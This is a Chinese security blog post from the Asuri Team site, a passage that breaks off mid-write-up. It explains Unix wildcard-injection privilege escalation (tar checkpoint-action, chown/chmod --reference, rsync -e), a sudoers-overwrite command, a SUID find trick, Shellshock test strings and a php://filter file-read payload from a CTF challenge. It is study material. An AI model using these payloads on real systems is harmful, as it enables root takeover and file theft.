@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>命令执行到提权 | Asuri Team</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="​    文章首发于先知社区：https://xz.aliyun.com/t/4309  之前在补天平台首发了巧用命令注入的N种方式，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。">
+<meta name="keywords" content="RCE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行到提权">
+<meta property="og:url" content="http://asuri.org/2019/03/12/命令执行到提权/index.html">
+<meta property="og:site_name" content="Asuri Team">
+<meta property="og:description" content="​    文章首发于先知社区：https://xz.aliyun.com/t/4309  之前在补天平台首发了巧用命令注入的N种方式，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g076e1djwtj21f207ugnv.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g076fskjccj21eo112k0s.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g076nnhf03j21ce11udpn.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g076ud4xu3j21g00byq6p.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g077ky6brvj21de0e0whf.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g077v4la9oj21bc096myu.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g077xmkqqfj21cs04m0tv.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g07b75pccgj219e0bajti.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g07bake27zj21bs11gagh.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g07bmvx77bj21bq0iwgqg.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g07bmvq2pzj21cm0awq5f.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g07hbgxzjqj21ba11otf9.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g07j2zpkzpj219k104n3g.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g07jecrkqfj222s18uwqp.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g07j1zh92pj21aw0feq6h.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g07kovadxzj21900zq44l.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g086tan6s4j21ba05owfx.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g086yus96kj21bg0e0jul.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g09eo8qpidj21ci05u75i.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g087vd79anj21ck11w79s.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g089zwyjecj227y172dpp.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g08a0lt3utj228016wdn6.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pjvce8uj2280170tit.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pkqonlij228016kafc.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pm4adlij228018ydpt.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pn7gs2ij228016oahz.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pqla9xjj228016uk3z.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pzce57rj228016s4a5.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g08qc2c4wpj219007staa.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g08rmk4tuyj21ik14cagc.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g08rqwh4dgj21i0148n4k.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g09blmqqltj20su0neu0x.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g09c248q7uj21i613wgvd.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyumwka7dqj20yy09cmy3.jpg">
+<meta property="og:updated_time" content="2020-11-16T16:08:33.874Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="命令执行到提权">
+<meta name="twitter:description" content="​    文章首发于先知社区：https://xz.aliyun.com/t/4309  之前在补天平台首发了巧用命令注入的N种方式，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g076e1djwtj21f207ugnv.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Asuri Team</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Asuri Secure yoUR Information.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-命令执行到提权" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/12/命令执行到提权/" class="article-date">
+  <time datetime="2019-03-12T05:44:47.000Z" itemprop="datePublished">2019-03-12</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web-安全/">Web 安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      命令执行到提权
+    </h1>
+  
+
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>​    文章首发于先知社区：<a href="https://xz.aliyun.com/t/4309" target="_blank" rel="external">https://xz.aliyun.com/t/4309</a></p>
+</blockquote>
+<p>之前在补天平台首发了<a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="external">巧用命令注入的N种方式</a>，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。</p>
+<a id="more"></a>
+<p>[TOC]</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这里我们讲讲在命令注入中更有意思的一种方法。</p>
+<h3 id="Wildcard-Wilderness"><a href="#Wildcard-Wilderness" class="headerlink" title="Wildcard Wilderness"></a>Wildcard Wilderness</h3><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h4><p>首先我们先看一个示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">"Hello Friends"</span> &gt; file1</div><div class="line"><span class="built_in">echo</span> <span class="string">"This is wildcard Injection"</span> &gt;file2</div><div class="line"><span class="built_in">echo</span> <span class="string">"take help"</span> &gt; --<span class="built_in">help</span></div></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g076e1djwtj21f207ugnv.jpg" alt=""></p>
+<p>首先创建几个文件，其中有一个是<code>--help</code>，然后使用<code>cat</code>命令读取文件内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cat file1</div><div class="line">cat file 2</div><div class="line">cat --<span class="built_in">help</span></div></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g076fskjccj21eo112k0s.jpg" alt=""></p>
+<p>如果按照我们预期的，是不是在第三个<code>cat --help</code>处应该是要读取<code>—help</code>文件的内容呢？然而我们执行<code>cat —help</code>却优先执行了<code>cat</code>命令的帮助选项，并没有读出<code>—help</code>里的内容。</p>
+<p>不仅是<code>cat</code>，<code>ls</code>等命令也会优先调用内置<code>--help</code>选项。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g076nnhf03j21ce11udpn.jpg" alt=""></p>
+<p>以及还有<code>--all</code>选项。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g076ud4xu3j21g00byq6p.jpg" alt=""></p>
+<p>其实讲道理，词法分析把对诸如<code>--help</code>、<code>--all</code>等选项优先处理为内置选项输出，看起来并没有任何问题</p>
+<p>这个技巧叫做<code>Wildcard wildness</code>，中文有人译为通配符在野。(<code>-all</code>、<code>--help</code>可以通过加入<code>./</code>成<code>./-all</code>、<code>./--help</code>来特指这个文件，避免这个问题)</p>
+<h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h4><p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g077ky6brvj21de0e0whf.jpg" alt=""></p>
+<p>如图，我们有两个文件，当用<code>rm *</code>的时候，只删掉了<code>file1</code>与<code>file2</code>，并没有删除<code>*</code></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g077v4la9oj21bc096myu.jpg" alt=""></p>
+<p>或者使用<code>rm file1 file2 -rf</code>逐个删除之时，也只删掉了<code>file1</code>与<code>file2</code></p>
+<p>使用<code>strace rm *</code>我们可以发现</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g077xmkqqfj21cs04m0tv.jpg" alt=""></p>
+<p>由于当前目录中存在<code>-rf</code>文件名，<code>rm</code>将<code>-rf</code>选项作为最后一个参数，并且递归删除当前目录中的所有文件。同样，若要删除可以加上<code>./-rf</code>进行删除</p>
+<h3 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h3><p>我们可以利用<code>Wildcard Wilderness</code>做一些更有用的事情。</p>
+<h4 id="File-Owner-Hijacking"><a href="#File-Owner-Hijacking" class="headerlink" title="File Owner Hijacking"></a>File Owner Hijacking</h4><p>现在我们有三个用户，一个<code>zedd</code>，一个<code>test</code>，一个<code>root</code>用户。</p>
+<p>我们分别用<code>zedd</code>与<code>test</code>创建了不同的文件，<code>1.php</code>与<code>test.php</code>都属于<code>test</code>用户的文件，<code>zedd.php</code>与<code>--reference=zedd.php</code>均属于<code>zedd</code>用户的文件。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g07b75pccgj219e0bajti.jpg" alt=""></p>
+<p>然后使用<code>root</code>用户使用<code>chown -R test:test *.php</code>命令，想把本目录下所有的<code>.php</code>文件修改为<code>test</code>用户所有。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g07bake27zj21bs11gagh.jpg" alt=""></p>
+<p>但是结果我们可以发现，结果该目录下所有的<code>.php</code>文件都被修改为了<code>zedd</code>用户所有，成功“提权”。</p>
+<p>原理我们可以用<code>strace chown -R zedd:zedd *.php</code>来看一下（注意这里换了一下，模拟想把<code>.php</code>文件改变成<code>zedd</code>用户所有）</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g07bmvx77bj21bq0iwgqg.jpg" alt=""></p>
+<p>我们可以看到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">execve(<span class="string">"/bin/chown"</span>, [<span class="string">"chown"</span>, <span class="string">"-R"</span>, <span class="string">"zedd:zedd"</span>, <span class="string">"config.php"</span>, <span class="string">"index.php"</span>, <span class="string">"--reference=.backdoor.php"</span>], 0x7ffe5b43b1e8 /* 35 vars */) = 0</div></pre></td></tr></table></figure>
+<p>跟我们上个例子原理其实一样，<code>--reference=.backdoor.php</code>被作为一个选项进行了处理，而</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">--reference=RFILE  use RFILE&apos;s owner and group rather than</div><div class="line">                         specifying OWNER:GROUP values</div></pre></td></tr></table></figure>
+<p><code>--reference=RFILE</code>这个选项则是使用<code>RFILE</code>的文件拥有者和用户组来改变文件属性，而不是使用传入的<code>OWNER:GROUP</code>参数。</p>
+<p>因此，在这种情况下，<code>chown</code>的<code>--reference</code>选项将覆盖指定为<code>root</code>用户输入的参数<code>zedd:zedd</code>，把此目录中所有<code>.php</code>文件的所有者改变与<code>.backdoor.php</code>的所有者<code>test</code>。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g07bmvq2pzj21cm0awq5f.jpg" alt=""></p>
+<p>所以，按照这种方法，我们可以劫持<code>root</code>将文件的所有权更改为任意用户，并“劫持”我们想要的文件。</p>
+<h4 id="Chmod-File-Reference"><a href="#Chmod-File-Reference" class="headerlink" title="Chmod File Reference"></a>Chmod File Reference</h4><p>类似<code>chown</code>的还有一个命令<code>chmod</code>，它也有<code>--reference=RFIE</code>的选项</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">--reference=RFILE  use RFILE<span class="string">'s mode instead of MODE values</span></div></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g07hbgxzjqj21ba11otf9.jpg" alt=""></p>
+<p>与<code>chown</code>类似，因为有<code>--reference=.backdoor.php</code>的存在，在使用<code>chmod 000 *</code>的时候也会把劫持到与<code>.backdoor.php</code>文件权限一样的权限</p>
+<h4 id="Tar命令利用"><a href="#Tar命令利用" class="headerlink" title="Tar命令利用"></a>Tar命令利用</h4><p>首先我们来看看<code>tar</code>命令帮助文档中的几个有意思的选项</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">--checkpoint[=NUMBER]  </div><div class="line">	display progress messages every NUMBERth record (default 10)</div><div class="line">--checkpoint-action=ACTION   </div><div class="line">	execute ACTION on each checkpoint</div></pre></td></tr></table></figure>
+<p>从帮助文档，我们大致可以从中理解到，<code>--checkpoint=1</code>可以用来显示信息，<code>--checkpoint-action=exec=sh shell.sh</code>可以用来执行命令</p>
+<p>先尝试构建一个<code>shell.sh</code>脚本，内容为<code>/usr/bin/id</code>，以及文件名为<code>--checkpoint=1</code>与<code>--checkpoint-action=exec=sh shell.sh</code>的文件，使用<code>tar -cf test.tar *</code>把当前目录下所有文件压缩到<code>test.tar</code>压缩包内</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g07j2zpkzpj219k104n3g.jpg" alt=""></p>
+<p>可见，<code>/usr/bin/id</code>已经被成功执行输出。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g07jecrkqfj222s18uwqp.jpg" alt=""></p>
+<p>与之前一样，<code>--checkpoint=1</code>与<code>--checkpoint-action=exec=sh shell.sh</code>被作为选项处理</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g07j1zh92pj21aw0feq6h.jpg" alt=""></p>
+<p>在 2018 SWPUCTF 上有一道 web 题考点也正是利用了这个点，由于题目官方没有开源，这里给一个比较详细的 @一叶飘零 师傅写的 wp 用于参考学习: <a href="https://skysec.top/2018/12/17/2018SWPUCTF-Web/#%E4%BF%A1%E6%81%AF%E5%86%8D%E6%AC%A1%E5%8F%91%E6%8E%98" target="_blank" rel="external">2018SWPUCTF-Web#信息再次发掘</a></p>
+<h4 id="rsync命令利用"><a href="#rsync命令利用" class="headerlink" title="rsync命令利用"></a>rsync命令利用</h4><p><code>rsync</code>命令可能比较少用，我们这里简单介绍一下</p>
+<blockquote>
+<p>NAME</p>
+<p>​    rsync - a fast, versatile, remote (and local) file-copying tool</p>
+</blockquote>
+<p><code>rsync</code>命令是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。使用一个远程shell程序(如<a href="http://man.linuxde.net/rsh" target="_blank" rel="external">rsh</a>、<a href="http://man.linuxde.net/ssh" target="_blank" rel="external">ssh</a>)来实现将本地机器的内容拷贝到远程机器。如：<code>rsync -t *.c foo:src</code>，复制当前本地文件夹下的所有的<code>.c</code>文件到 foo 远程服务器的<code>/src</code>文件夹下。</p>
+<p><code>rsync</code>帮助文档含有以下几个比较有意思的选项</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-e, --rsh=COMMAND           specify the remote shell to use</div><div class="line">    --rsync-path=PROGRAM    specify the rsync to run on remote machine</div></pre></td></tr></table></figure>
+<p><code>--rsh=COMMAND</code>又是一个我们可以利用的地方，我们首先创建一个文件名为<code>-e sh shell.c</code>的文件，然后再创建一个<code>shell.c</code>文件，污染<code>rsync</code>参数来实现执行我们在<code>shell.c</code>中写入的预期命令</p>
+<p>假设当前目录下我们拥有一个只有<code>root</code>用户可读的<code>rootfile</code>文件，由于不能直接输出结果，我们可以构造<code>cat ./rootfile &gt; ./output</code>，将文件内容读出。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g07kovadxzj21900zq44l.jpg" alt=""></p>
+<p>得到的<code>output</code>文件是 644 的权限，这样我们就成功构造了一个提权读取的文件的 payload ，这里可能需要注意的是，只能提取到执行<code>rsync</code>用户的权限，不是直接的<code>root</code>权限，这里因为执行命令的是<code>root</code>权限，所以能读取只有<code>root</code>用户才能读取的<code>rootfile</code>文件</p>
+<h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><ul>
+<li><p>既然能执行命令，其实我们可以参照上篇列举的反弹 shell 的方式将 shell 反弹给我们，也可以配合<code>msfvenom</code>来使用。</p>
+</li>
+<li><p><code>tar</code>命令比较多的都用在<code>/etc/crontab</code>计划任务中，经常会有管理员会用<code>crontab</code>来执行一些<code>tar</code>命令的备份操作，而且<code>crontab</code>执行的权限还是<code>root</code>权限，所以这是个很好利用的点</p>
+</li>
+<li><p><code>tar</code>命令需要进入到<code>--checkpoint=1</code>文件所在的目录内，如果加上绝对路径将会失效，例如<code>tar cf test.tar /var/www/html/*</code></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g086tan6s4j21ba05owfx.jpg" alt=""></p>
+<p>我们可以看到 shell 处理方式将<code>/home/zedd/Desktop/test</code>与目录下的文件名逐个拼接起来，就达不到污染参数的效果了</p>
+</li>
+<li><p>还可以用<code>echo &quot;zedd ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers</code>，把自己直接写入管理员组</p>
+</li>
+<li><p>利用<code>chmod u+s /usr/bin/find</code>提升为<code>root</code>权限执行，配合<code>find</code>命令的<code>-exec COMMAND</code>来执行命令，例如<code>find f1 -exec &quot;whoami&quot; \;</code></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g086yus96kj21bg0e0jul.jpg" alt=""></p>
+</li>
+</ul>
+<p>文章中讨论的技术可以以不同的形式在各种流行的Unix工具上应用，这里仅仅是抛砖引玉，列举一部分命令。 在实际攻击中，任意 shell 选项/参数都可以隐藏在常规文件中，管理员也不容易发现，比如使用<code>.backdoor.php</code>等形式。</p>
+<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><p>这里讲讲几个虽然不属于提权，但是也比较有意思的几个点。</p>
+<h4 id="Echo"><a href="#Echo" class="headerlink" title="Echo"></a>Echo</h4><p><code>echo *</code>可以用来显示目录，<code>echo /???g</code>可以用来探测文件</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g09eo8qpidj21ci05u75i.jpg" alt=""></p>
+<h4 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h4><blockquote>
+<p>NAME</p>
+<p>​    ln - make links between files</p>
+</blockquote>
+<p><code>ln</code>命令常常用于链接两个文件，而且分两种链接模式，一种硬链接一种软链接，详细可以参考<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html" target="_blank" rel="external">理解Linux硬链接与软链接</a>。这里主要讲讲软链接，软链接相当于我们 Windows 中的快捷方式，可以使用<code>ln -s</code>创建</p>
+<p>例如，这里我们根目录下有一个文件内容为<code>flag{xxx}</code>的名为<code>flag</code>文件，我们使用<code>ln -s /flag file</code>，在当前目录下创建一个<code>file</code>文件链接到<code>/flag</code>，使用<code>cat file</code>与<code>php -r &quot;echo file_get_contents(&#39;file&#39;)&quot;</code>均可以读取到<code>/flag</code>的内容。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g087vd79anj21ck11w79s.jpg" alt=""></p>
+<p>这个软链接读取文件内容已经被多次利用</p>
+<ul>
+<li>在 GitLab CVE-2016-9086 也是利用了这点，参考<a href="https://paper.seebug.org/104/" target="_blank" rel="external">GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞</a></li>
+<li>CTF 中也出现了类似的题目，参考<a href="https://xz.aliyun.com/t/2589" target="_blank" rel="external">一个有趣的任意文件读取</a>，以及在 2018 年赛博地球杯上有一道题也是利用这个点，参考<a href="https://cl0und.github.io/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/" target="_blank" rel="external">记录一道题的多种解法</a>，<a href="https://www.xctf.org.cn/library/details/cyberearth-writeup/?from=groupmessage&amp;isappinstalled=0" target="_blank" rel="external">“赛博地球杯”工业互联网安全大赛线上赛Writeup</a></li>
+</ul>
+<h4 id="ShellShock-CVE-2014-6271"><a href="#ShellShock-CVE-2014-6271" class="headerlink" title="ShellShock(CVE-2014-6271)"></a>ShellShock(CVE-2014-6271)</h4><p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的 shell 命令，甚至完全控制目标系统，详细分析参考<a href="https://www.freebuf.com/articles/system/45390.html" target="_blank" rel="external">破壳（ShellShock）漏洞样本分析报告</a></p>
+<blockquote>
+<ul>
+<li><p>CVE-2014-6271 测试方式:</p>
+<p>env x=’() { :;}; echo vulnerable’ bash -c “echo this is a test” </p>
+</li>
+<li><p>CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)<br>env -i X=’;() { (a)=&gt;\’ bash -c ‘echo date’; cat echo</p>
+</li>
+</ul>
+</blockquote>
+<h4 id="从一道题看Shell-Shock"><a href="#从一道题看Shell-Shock" class="headerlink" title="从一道题看Shell Shock"></a>从一道题看Shell Shock</h4><p>题目地址：<a href="https://command-executor.hackme.inndy.tw/index.php" target="_blank" rel="external">command-executor</a>——来源于 <a href="https://hackme.inndy.tw" target="_blank" rel="external">HackMe</a></p>
+<p>题目描述：</p>
+<blockquote>
+<p>​    Here’s my useless developer assistant website, try to execute your own command!</p>
+</blockquote>
+<p>题目大体思路是：</p>
+<ul>
+<li>读取源码</li>
+<li>Shell Shock命令执行</li>
+<li>重定向读写文件</li>
+</ul>
+<p>题目设置为几个功能，一个<code>man</code>命令的帮助文档</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g089zwyjecj227y172dpp.jpg" alt=""></p>
+<p>选择了<code>ls</code>，多了个请求参数<code>file=ls</code></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g08a0lt3utj228016wdn6.jpg" alt=""></p>
+<p>尝试用其他命令，比如<code>find</code></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pjvce8uj2280170tit.jpg" alt=""></p>
+<p>猜测<code>eval(&quot;man /bin/&quot; + command)</code>或者一些其他的目录</p>
+<p><code>Tar Tester</code>界面可以上传压缩包但是并没有解压，只是<code>tar -tvf test.tar</code>查看压缩包内的内容</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pkqonlij228016kafc.jpg" alt=""></p>
+<p><code>Cmd Exec</code>界面只有两个命令，一个<code>ls</code>，一个<code>env</code></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pm4adlij228018ydpt.jpg" alt=""></p>
+<p><code>List files</code>是个目录列举界面，可以列举几个目录</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pn7gs2ij228016oahz.jpg" alt=""></p>
+<p>观察题目，题目 url<code>https://command-executor.hackme.inndy.tw/index.php?func=untar</code>等均带有<code>func=xxx</code>参数来展示页面，猜测会有文件包含漏洞，尝试使用<code>func=php://filter/read=convert.base64-encode/resource=index</code>读取文件内容，成功得到回显</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g08pqla9xjj228016uk3z.jpg" alt=""></p>
+<p>解码得到 <code>index.php</code>源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$pages = [</div><div class="line">    [&apos;man&apos;, &apos;Man&apos;],</div><div class="line">    [&apos;untar&apos;, &apos;Tar Tester&apos;],</div><div class="line">    [&apos;cmd&apos;, &apos;Cmd Exec&apos;],</div><div class="line">    [&apos;ls&apos;, &apos;List files&apos;],</div><div class="line">];</div><div class="line"></div><div class="line">function fuck($msg) &#123;</div><div class="line">    header(&apos;Content-Type: text/plain&apos;);</div><div class="line">    echo $msg;</div><div class="line">    exit;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$black_list = [</div><div class="line">    &apos;\/flag&apos;, &apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;</div><div class="line">];</div><div class="line"></div><div class="line">function waf($a) &#123;</div><div class="line">    global $black_list;</div><div class="line">    if(is_array($a)) &#123;</div><div 